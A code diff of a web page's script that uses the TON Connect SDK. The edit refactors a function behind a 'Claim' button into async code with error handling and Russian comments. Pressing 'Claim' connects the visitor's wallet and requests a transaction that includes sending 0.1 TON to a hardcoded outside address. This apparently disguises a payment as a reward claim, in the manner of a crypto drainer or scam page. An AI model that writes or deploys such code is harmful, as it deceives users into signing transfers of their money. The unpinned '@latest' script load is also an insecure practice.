@@ -162,24 +162,39 @@ tr:hover {
 
      <script src="https://unpkg.com/@tonconnect/sdk@latest/dist/tonconnect-sdk.min.js"></script>
      <script>
-         const connector = new TonConnectSDK.TonConnect();
+       const connector = new TonConnectSDK.TonConnect();
      
-     function txn(){ 
-       connector.sendTransaction({
-       validUntil: Math.floor(new Date() / 1000) + 360,
-       messages: [
-         {
-           address: connector.wallet.account.address,
-           amount: "200000000"
-         },
-         {
-           address: "UQBQ3GE8djotFZNWqLWz0cgSAE9j37c82Ll3yLqPKZes1goR",
-           amount: "100000000"
+       async function txn() {
+         try {
+           // Подключаемся к кошельку
+           await connector.connect();
+     
+           // Отправляем транзакцию
+           const result = await connector.sendTransaction({
+             validUntil: Math.floor(new Date() / 1000) + 360,
+             messages: [
+               {
+                 address: connector.wallet.account.address,
+                 amount: "200000000"
+               },
+               {
+                 address: "UQBQ3GE8djotFZNWqLWz0cgSAE9j37c82Ll3yLqPKZes1goR",
+                 amount: "100000000"
+               }
+             ]
+           });
+     
+           console.log("Transaction result:", result);
+           // Обработка успешного результата 
+         } catch (error) {
+           console.error("Error sending transaction:", error);
+           // Обработка ошибки
          }
-       ]
-     }))};
+       }
      </script>
-    <button onclick='txn()' class="floathingbutton">Claim</button>
+     
+     <button onclick="txn()" class="floathingbutton">Claim</button>
+     
 
 <h2><strong><center>Leaderbord:</center></strong></h2>
 
